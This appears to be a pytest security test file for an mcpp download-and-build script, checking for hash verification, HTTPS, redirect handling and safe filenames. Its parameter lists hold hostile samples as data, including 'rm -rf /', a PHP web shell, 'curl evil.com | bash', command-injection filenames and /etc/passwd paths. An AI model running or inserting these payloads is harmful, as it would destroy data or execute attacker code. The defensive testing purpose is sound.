import pytest
import ast
import os
import re


ADVERSARIAL_URLS = [
    "http://evil.com/malware.tar.gz",
    "https://sourceforge.net.evil.com/mcpp.tar.gz",
    "ftp://sourceforge.net/mcpp.tar.gz",
    "http://127.0.0.1:8080/mcpp.tar.gz",
    "http://localhost/mcpp.tar.gz",
    "https://sourceforge.net/projects/mcpp/files/mcpp/V2.7.2/mcpp-2.7.2.tar.gz/../../../evil.tar.gz",
    "https://sourceforge.net/projects/mcpp/files/mcpp/V2.7.2/mcpp-2.7.2.tar.gz?redirect=http://evil.com/malware",
    "file:///etc/passwd",
    "https://sourceforge.net@evil.com/mcpp.tar.gz",
    "javascript:alert(1)",
    "",
    "https://sourceforge.net/projects/mcpp/files/mcpp/V2.7.2/mcpp-2.7.2.tar.gz\x00evil",
    "https://sourceforge.net/projects/mcpp/files/mcpp/V2.7.2/" + "A" * 10000 + ".tar.gz",
]

ADVERSARIAL_CONTENT = [
    b"#!/bin/bash\nrm -rf /\n",
    b"MZ\x90\x00" + b"\x00" * 100,  # PE header magic
    b"\x7fELF" + b"\x00" * 100,     # ELF header magic
    b"<?php system($_GET['cmd']); ?>",
    b"\x00" * 1024,
    b"A" * (100 * 1024 * 1024),     # 100MB of 'A's (simulated large payload)
    b"../../../etc/passwd\x00",
    b"PK\x03\x04" + b"\x00" * 100,  # ZIP magic (zip bomb simulation)
]


SCRIPT_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "package-system", "mcpp", "get_and_build_mcpp.py"
)

FALLBACK_SCRIPT_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "get_and_build_mcpp.py"
)


def find_script():
    for path in [SCRIPT_PATH, FALLBACK_SCRIPT_PATH]:
        if os.path.exists(path):
            return path
    return None


def get_script_source():
    path = find_script()
    if path and os.path.exists(path):
        with open(path, "r") as f:
            return f.read()
    return None


@pytest.mark.parametrize("payload", ADVERSARIAL_URLS)
def test_download_url_integrity_check_invariant(payload):
    """Invariant: Any download operation in the build script must be accompanied
    by cryptographic hash verification before the downloaded content is used.
    The script must never use downloaded content without verifying its integrity."""
    source = get_script_source()
    if source is None:
        pytest.skip("Script not found at expected path")

    # Parse the AST to find all requests.get() calls
    try:
        tree = ast.parse(source)
    except SyntaxError:
        pytest.fail("Script has syntax errors, cannot analyze")

    hash_verification_patterns = [
        r'hashlib\.',
        r'sha256',
        r'sha512',
        r'md5',
        r'checksum',
        r'verify.*hash',
        r'hash.*verify',
        r'digest',
        r'hmac',
    ]

    has_hash_verification = any(
        re.search(pattern, source, re.IGNORECASE)
        for pattern in hash_verification_patterns
    )

    download_calls = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            func = node.func
            if isinstance(func, ast.Attribute):
                if func.attr == 'get' and isinstance(func.value, ast.Name):
                    if func.value.id == 'requests':
                        download_calls.append(node)
            elif isinstance(func, ast.Name):
                if func.id in ('urlretrieve', 'urlopen', 'wget'):
                    download_calls.append(node)

    if download_calls:
        assert has_hash_verification, (
            f"SECURITY INVARIANT VIOLATED: Script performs {len(download_calls)} "
            f"download operation(s) without any cryptographic hash verification. "
            f"Downloaded content (potentially adversarial like '{payload[:50]}...') "
            f"must be verified before use in the build pipeline. "
            f"Add SHA-256 or stronger hash verification after each download."
        )


@pytest.mark.parametrize("malicious_content", ADVERSARIAL_CONTENT[:4])
def test_downloaded_content_not_executed_without_verification(malicious_content):
    """Invariant: The build script must verify downloaded content integrity
    before writing to disk or executing. Adversarial content must never
    be blindly written and executed."""
    source = get_script_source()
    if source is None:
        pytest.skip("Script not found at expected path")

    write_patterns = [
        r'\.write\(',
        r'open\(.*["\']wb["\']',
        r'open\(.*["\']w["\']',
    ]

    exec_patterns = [
        r'subprocess\.',
        r'os\.system\(',
        r'os\.exec',
        r'exec\(',
        r'eval\(',
    ]

    hash_patterns = [
        r'hashlib\.',
        r'sha256',
        r'sha512',
        r'checksum',
        r'digest',
    ]

    has_writes = any(re.search(p, source) for p in write_patterns)
    has_exec = any(re.search(p, source) for p in exec_patterns)
    has_hash = any(re.search(p, source, re.IGNORECASE) for p in hash_patterns)

    if has_writes or has_exec:
        assert has_hash, (
            f"SECURITY INVARIANT VIOLATED: Script writes or executes content "
            f"(has_writes={has_writes}, has_exec={has_exec}) without hash verification "
            f"(has_hash={has_hash}). Adversarial content of length {len(malicious_content)} "
            f"starting with {malicious_content[:16]!r} could be injected via supply chain attack."
        )


def test_no_allow_redirects_without_verification():
    """Invariant: When allow_redirects=True is used in download calls,
    the final downloaded content MUST be hash-verified, as redirects
    can be hijacked to serve malicious content."""
    source = get_script_source()
    if source is None:
        pytest.skip("Script not found at expected path")

    has_allow_redirects = bool(re.search(r'allow_redirects\s*=\s*True', source))

    hash_patterns = [
        r'hashlib\.',
        r'sha256',
        r'sha512',
        r'checksum',
        r'digest',
        r'verify',
    ]
    has_hash_verification = any(
        re.search(p, source, re.IGNORECASE) for p in hash_patterns
    )

    if has_allow_redirects:
        assert has_hash_verification, (
            "SECURITY INVARIANT VIOLATED: Script uses allow_redirects=True "
            "without any cryptographic hash verification. An attacker who can "
            "intercept or manipulate redirects (MITM, DNS hijacking, CDN compromise) "
            "can serve arbitrary malicious content that will be used in the build pipeline."
        )


def test_https_enforced_for_downloads():
    """Invariant: All download URLs must use HTTPS to prevent
    man-in-the-middle attacks on the download channel."""
    source = get_script_source()
    if source is None:
        pytest.skip("Script not found at expected path")

    http_url_pattern = re.compile(r'["\']http://[^"\']+["\']')
    http_matches = http_url_pattern.findall(source)

    localhost_exceptions = {'http://localhost', 'http://127.0.0.1'}
    non_local_http = [
        url for url in http_matches
        if not any(exc in url for exc in localhost_exceptions)
    ]

    assert not non_local_http, (
        f"SECURITY INVARIANT VIOLATED: Script uses non-HTTPS URLs for downloads: "
        f"{non_local_http}. All external downloads must use HTTPS to prevent "
        f"man-in-the-middle attacks."
    )


@pytest.mark.parametrize("payload", [
    "mcpp-2.7.2.tar.gz; rm -rf /",
    "mcpp-2.7.2.tar.gz && curl evil.com | bash",
    "mcpp-2.7.2.tar.gz`whoami`",
    "../../../etc/cron.d/evil",
    "mcpp-2.7.2.tar.gz\nrm -rf /",
])
def test_filename_not_derived_from_untrusted_input(payload):
    """Invariant: Filenames used for saving downloaded content must be
    hardcoded or sanitized, never derived from untrusted URL components
    that could enable path traversal or command injection."""
    source = get_script_source()
    if source is None:
        pytest.skip("Script not found at expected path")

    dangerous_patterns = [
        r'url\.split\(["\'/]["\']?\)\[-1\]',
        r'os\.path\.basename\(url\)',
        r'url\.rsplit\(',
        r'filename.*=.*url',
        r'fname.*=.*url',
    ]

    has_dangerous_filename = any(
        re.search(p, source, re.IGNORECASE)
        for p in dangerous_patterns
    )

    assert not has_dangerous_filename, (
        f"SECURITY INVARIANT VIOLATED: Script may derive filenames from URL content. "
        f"Adversarial payload '{payload}' in a URL could lead to path traversal "
        f"or command injection when used as a filename."
    )